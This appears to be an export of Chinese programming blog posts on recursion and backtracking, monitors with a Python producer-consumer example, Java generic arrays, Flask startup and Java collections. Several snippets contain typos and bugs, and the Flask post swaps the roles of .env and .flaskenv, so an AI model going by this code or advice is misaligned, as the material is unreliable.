    <url>/2020/01/19/%E9%80%92%E5%BD%92%E3%80%81%E8%BF%AD%E4%BB%A3%E4%B8%8E%E5%9B%9E%E6%BA%AF/</url>
    <content><![CDATA[<h1 id="递归、迭代与回溯"><a href="#递归、迭代与回溯" class="headerlink" title="递归、迭代与回溯"></a>递归、迭代与回溯</h1><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归是程序执行过程函数调用自己不断压栈的过程，将一个大问题分解为若干个性质相似的小问题。一个递归模型必须包含两部分： <strong>递归体</strong> 和 <strong>递归出口</strong> 。以求解斐波那契数列为例，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n  <span class="comment"># 递归出口</span></span><br><span class="line">    <span class="keyword">return</span> Fib(n-<span class="number">1</span>) + Fib(n-<span class="number">2</span>)  <span class="comment"># 递归体</span></span><br></pre></td></tr></table></figure>

<h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>递归深度过大会导致浪费系统资源，同时拖慢程序运行速度。所以，有时候我们需要把递归解法转化为非递归。</p>
<p>对于不需要回溯的问题，可用直接转换法，用中间变量来保存中间结果。这种方法在 <strong>尾递归</strong> 或 <strong>单向递归</strong> 中很常见，还是以斐波那契数列为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        result = i + j  <span class="comment"># 用中间变量保存迭代结果</span></span><br><span class="line">        i = j</span><br><span class="line">        j = result</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>对于不能直接求值，需要回溯的问题，利用栈保存中间结果。例如下面这个逆序输出用户输入的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (!x) sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> test(sum);</span><br><span class="line">    sum += x;</span><br><span class="line">    <span class="built_in">printf</span>(“%d”, um);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见这个函数不是简单的单向递归，在递归结束后还要执行一些操作。这就必须用栈来消去递归：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ditui</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack S;</span><br><span class="line">    StackInitiate(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> x, e;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x) ;</span><br><span class="line">    <span class="keyword">while</span> (x)</span><br><span class="line">    &#123;</span><br><span class="line">        StackPush(&amp;S, x);</span><br><span class="line">        <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    sum=<span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    <span class="keyword">while</span> (StackNotEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        StackPop(&amp;S, &amp;e);</span><br><span class="line">        sum+=e;</span><br><span class="line">        <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>管程</title>
    <url>/2019/10/13/%E7%AE%A1%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h1><p>管程是一种抽象概念，封装了一个锁、几个条件变量和共享资源。锁保证了某个时刻只有一个线程能进入管程，而条件变量用来控制共享资源。</p>
<h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>每个条件变量表示一种等待原因，对应一个队列，当进程由于共享资源被占用进入等待状态时，我们称其 <code>挂在</code> 某个条件变量上。</p>
<p>条件变量有一个 wait 方法和一个 signal 方法。wait 方法释放当前线程进入管程时获得的锁然后阻塞它。如果有线程挂在这个条件变量上，signal 方法会释放一个队列中的线程，否则 signal 就是一个空操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading improt Event, get_ident</span><br><span class="line"><span class="keyword">from</span> Collections improt deque</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.waitting_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        self.queue = deque</span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span>(<span class="params">self, lock</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.waitting_value += <span class="number">1</span></span><br><span class="line">        self.queue.append(get_ident())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing wait()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.waitting_value &gt; <span class="number">0</span>:</span><br><span class="line">            self.queue.popleft()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing signal()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">            event.<span class="built_in">set</span>()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.waitting_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="用管程实现生产者-消费者问题"><a href="#用管程实现生产者-消费者问题" class="headerlink" title="用管程实现生产者-消费者问题"></a>用管程实现生产者-消费者问题</h2><p>问题描述：</p>
<ul>
<li>一个或多个生产者产生数据后放在缓冲区里</li>
<li>单个消费者从缓冲区里取出数据处理</li>
<li>任何时刻只有一个生产者或消费者可以访问缓冲区</li>
</ul>
<p>问题分析：</p>
<ul>
<li>任何时刻只能有一个线程操作缓冲区（互斥访问）</li>
<li>缓冲区空时，消费者必须等待生产者（条件同步）</li>
<li>缓冲区满时，生产者必须等待消费者（条件同步）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Event, get_ident, Thread</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.wait_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span>(<span class="params">self, lock</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.wait_value += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing wait()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.wait_value &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing signal()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">            event.<span class="built_in">set</span>()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.wait_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundBuffer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, <span class="built_in">max</span></span>):</span></span><br><span class="line">        self.count = <span class="number">0</span>  <span class="comment"># 共享资源</span></span><br><span class="line">        self.not_full = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.not_empty = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.lock = Lock()  <span class="comment"># 锁</span></span><br><span class="line">        self.buffer = deque()</span><br><span class="line">        self.<span class="built_in">max</span> = <span class="built_in">max</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == self.<span class="built_in">max</span>:</span><br><span class="line">                self.not_full.wait(self.lock)</span><br><span class="line">            product = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            self.buffer.append(product)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;add &#123;&#125; to the buffer&quot;</span>.<span class="built_in">format</span>(product))</span><br><span class="line">            self.count += <span class="number">1</span></span><br><span class="line">            self.not_empty.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == <span class="number">0</span>:</span><br><span class="line">                self.not_empty.wait(self.lock)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;remove &#123;&#125; from the buffer&quot;</span>.<span class="built_in">format</span>(self.buffer.popleft()))</span><br><span class="line">            self.count -= <span class="number">1</span></span><br><span class="line">            self.not_full.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    model = BoundBuffer(<span class="number">3</span>)</span><br><span class="line">    generator = Thread(target=model.deposit,)</span><br><span class="line">    comsumer = Thread(target=model.remove,)</span><br><span class="line">    generator.start()</span><br><span class="line">    comsumer.start()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 禁止创建泛型数组</title>
    <url>/2019/01/27/Java%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>java 不允许直接创建泛型数组，也不允许创建泛型实例。也就是说下面这种情况是不被允许的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> T[] a = <span class="keyword">new</span> T[<span class="number">1</span>]; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">private</span> T t = <span class="keyword">new</span> T(); <span class="comment">// error</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java 的泛型只停留在了编译层，编译器在编译完成后，会把泛型信息擦除，用第一个限定类型来替代，没有指定限定类型的泛型参数则用 Object 类替代：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定了泛型参数的限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T extends Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Object&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>经过类型擦除后，拥有不同泛型参数的泛型类在虚拟机眼中就是一样的了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt; t1 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">Test&lt;Integer&gt; t2 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">t1.getClass() == t2.getClass(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>java 允许父类的引用类型指向子类实例，而 Object[ ] 是任何数组的父类，这个时候如果我们往里面放不同于原始数据类型 但是满足后来使用的父类类型的话，编译不会有问题。如果是普通类，这样做也不会有什么问题，因为在运行时会检查加入数组的对象的类型，所以下面这段代码运行时会报错 ArrayStoreException：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">Object[] o = s; <span class="comment">// OK</span></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">2</span>);</span><br><span class="line">o[<span class="number">0</span>] = i; <span class="comment">// throws ArrayStoreException</span></span><br></pre></td></tr></table></figure>

<p>如果可以创建泛型数组，那么一个 Object 数组引用类型指向这个泛型数组实例是可行的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt;[] tarr = new Test&lt;&gt;[10]; // 实际不行，假设可行</span><br><span class="line">Object[] o = tarr;</span><br></pre></td></tr></table></figure>

<p>编译器编译时会根据引用类型进行类型检查，所以以下代码可以通过编译。在运行时会检查加入数组的对象的类型，但由于类型擦除，不同泛型参数的泛型类在虚拟机眼里是类型相同的，那么在运行时一个 Test<Integer> 实例成功被放进 Test<String>[ ] 中了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;Integer&gt; t = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">o[<span class="number">0</span>] = t;</span><br></pre></td></tr></table></figure>

<p>一个与泛型数组类型不同的实例可以被加入数组中而 java 无法检测到这一错误。那么很显然无法保证泛型数组元素类型的一致性，其后果不言而喻。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask——启动吧，Flask！</title>
    <url>/2018/11/15/Flask%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>以前虚拟环境主要靠 virtualenv， 配合 requirements.txt 做到一键安装依赖的效果。但是 requirements.txt 需要手动管理包记录，每次安装新的包之后都要更新这个文件，很麻烦。现在有了新的工具 pipenv。pipenv 将虚拟环境配置与依赖包管理整合在一起，并自动记录依赖包的安装、更新与卸载。真正做到了”一键使用“。pipenv 的用法参考<a href="https://zhuanlan.zhihu.com/p/37581807">这篇文章</a>。</p>
<span id="more"></span>

<h2 id="启动Flask"><a href="#启动Flask" class="headerlink" title="启动Flask"></a>启动Flask</h2><p>在 Flask 更新到版本 1.0 以后，不再推荐使用下面的方式启动 Flask</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>取而代之的是命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>

<p>Flask 根据以下规则会自动探测程序实例：</p>
<ol>
<li>从当前目录寻找 app.py 或 wsgi.py 模块，并从中寻找名为 app 或 application 的实例</li>
<li>从环境变量 FLASK_APP 对应的值寻找名为 app 或 application 的实例</li>
</ol>
<p>例如，如果 Flask 实例 app 位于 hello.py，将 FLASK_APP 设为 hello，Flask 就会在当前目录的 hello.py 模块寻找实例</p>
<p>Flask 默认为生产模式(production mode), 通过环境变量 FLASK_ENV 可以修改为开发模式(debug mode)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FLASK_ENV = development</span><br></pre></td></tr></table></figure>

<p>利用 –host 与 –port 参数可以修改 Flask 运行主机与端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask run --host=0.0.0.0</span><br><span class="line">flask run --port=9000</span><br></pre></td></tr></table></figure>

<p>也可以通过环境变量 FLASK_RUN_HOST 与 FLASK_RUN_PORT 设置。</p>
<p>可以通过 <code>flask --help</code> 查看所有可用命令</p>
<h2 id="管理环境变量"><a href="#管理环境变量" class="headerlink" title="管理环境变量"></a>管理环境变量</h2><p>如果安装了 python-dotenv 包， Flask 会从 .env 文件 和 .flaskenv 文件中加载环境变量。此时 Flask 加载环境变量的优先级是：系统环境变量 &gt; .env 中的环境变量 &gt; .flaskenv 中的环境变量</p>
<p>.env 用于存放公开环境变量, 如 FLAKS_APP, .flaskenv 用于存放敏感环境变量如 Email 账号密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!# MyFlask/.env</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这是注释</span></span><br><span class="line">FLASK_APP = hello</span><br></pre></td></tr></table></figure>

<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>用如下命令可以启动带有上下文的 Python Shell 环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask shell</span><br></pre></td></tr></table></figure>

<p>和其他 flask 命令相同，在执行这个命令前要确保 Flask 实例可以被找到</p>
<h2 id="flask-命令"><a href="#flask-命令" class="headerlink" title="flask 命令"></a>flask 命令</h2><p>通过为一个函数添加 @app.cli.command() 装饰器，可以注册一个 flask 命令。函数的名称即为命令名，也可以通过给装饰器传参的方式命名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.cli.command(<span class="params"><span class="string">&#x27;greet&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    click.echo(<span class="string">&#x27;hello!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flask 命令是通过 Click 包实现的，更多关于自定义命令的设置和功能请看<a href="http://click.pocoo.org/6/">Click文档</a></p>
]]></content>
      <categories>
        <category>Web开发</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>java基础-使用集合类</title>
    <url>/2018/06/28/java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="将集合的接口与实现分离"><a href="#将集合的接口与实现分离" class="headerlink" title="将集合的接口与实现分离"></a>将集合的接口与实现分离</h1><p>Java集合类库将<code>接口（interface）</code>与<code>实现（implementation）</code>分离。在使用集合类时，一旦构建了集合就不需要知道究竟使用了哪种实现，因此只有在构建集合对象时使用具体的类才有意义。可以使用<code>接口类型</code>存放集合的引用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">expressLane.add(<span class="keyword">new</span> Customer(<span class="string">&quot;David&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>这样做有利于随时更改实现类型，当发现有更合适的实现类时，只需要修改调用构造器处的代码就可以了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> CirculArrayQueue&lt;&gt;(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h1><p>集合类的基本接口是<code>Collection接口</code>,这个接口有两个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E element)</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>add方法用于向集合中添加元素。如果添加成功返回true，否则false。<br>iterator方法返回一个实现了Iterator接口的对象，这个对象又称为<code>迭代器</code>，可以用这个迭代器依次访问集合中的元素</p>
<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>Iterator接口包含4个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; action)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java迭代器的查找与位置变更是紧密相连的，查找一个元素的唯一方法是调用<code>next()</code>，而在执行查找操作时，迭代器的位置随之向前移动。当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。而<code>remove()</code>会从迭代器中删除上次调用<code>next()</code>方法时返回的元素。</p>
<p>迭代器应理解为处于两个元素之间，当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。</p>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>Java中所有链表都是双向的。对于链表，尽量不使用随机访问而使用遍历操作，否则效率很低。Java提供了LinkedList类，可以很简单实现列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;(); <span class="comment">// LinkedList类实现了List接口</span></span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line">Iterator&lt;String&gt; iterator = staff.iterator();</span><br><span class="line">iterator.next();</span><br><span class="line">iterator.remove();</span><br></pre></td></tr></table></figure>
<p>通过<code>add</code>方法可以向链表尾部添加元素。想要在链表中间插入元素，由于迭代器是表述集合中位置的，所以要借助迭代器实现，而只有在有序集合中这样做才有意义，Iterator是使用与所有集合的，所以对于有序集合，Java提供了Iterator的子类ListIterator：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">ListIterator&lt;String&gt; iter = staff.ListIterator();</span><br><span class="line">iter.next();</span><br><span class="line">iter.add(<span class="string">&quot;Mike&quot;</span>); <span class="comment">// 在Susan之后，David之前添加Mike</span></span><br><span class="line">String first = iter.previous();  <span class="comment">// 反向遍历链表</span></span><br><span class="line">iter.remove(); <span class="comment">// 删除被previous越过的元素Mike</span></span><br></pre></td></tr></table></figure>
<p><code>set</code>方法用于替换被next或previous越过的元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">staff.next();</span><br><span class="line">staff.set(<span class="string">&quot;Mike&quot;</span>); <span class="comment">// Susan被替换为Mike</span></span><br></pre></td></tr></table></figure>

<h1 id="泛型数组列表"><a href="#泛型数组列表" class="headerlink" title="泛型数组列表"></a>泛型数组列表</h1><p>在Java中，可以用变量来确定数组的大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee staff[] = <span class="keyword">new</span> Employee[num];</span><br></pre></td></tr></table></figure>
<p>为了达到数组动态变长/缩短的效果，使用泛型数组列表<code>ArrayList</code>。<em>泛型</em>即“参数化类型”、将类型参数化，类似于方法中的变量参数，只是此时类型也定义成参数形式（又称为类型参数）。为了指定数组列表保存的元素对象类型，需要用一对尖括号将类名括起来加在后面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br></pre></td></tr></table></figure>
<p>用<code>add([int index,]obj)</code>方法往数组列表添加元素，不指定索引则默认加到末尾。<code>remove(int index)</code>删除元素，<code>get(int index)</code>按索引获取元素，<code>set(int index, obj)</code>重置对应索引的元素（不能用于添加元素），<code>size()</code>方法获取ArrayList长度。</p>
<h2 id="将数组列表拷贝到数组"><a href="#将数组列表拷贝到数组" class="headerlink" title="将数组列表拷贝到数组"></a>将数组列表拷贝到数组</h2><p>用<code>toArray()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">X[] a = <span class="keyword">new</span> X[list.size()];</span><br><span class="line">list.toArray(a);</span><br></pre></td></tr></table></figure>
<h2 id="泛型化与原始数组列表之间的兼容性"><a href="#泛型化与原始数组列表之间的兼容性" class="headerlink" title="泛型化与原始数组列表之间的兼容性"></a>泛型化与原始数组列表之间的兼容性</h2><p>在编译之后程序会采取去泛型化的措施。也就是说Java中的泛型，只在编译阶段有效。在编译过程中，正确检验泛型结果后，会将泛型的相关信息擦除，并且在对象进入和离开方法的边界处添加类型检查和类型转换的方法。也就是说，泛型信息不会进入到运行时阶段。</p>
<p>对此总结成一句话：泛型类型在逻辑上看以看成是多个不同的类型，实际上都是相同的基本类型ArrayList。</p>
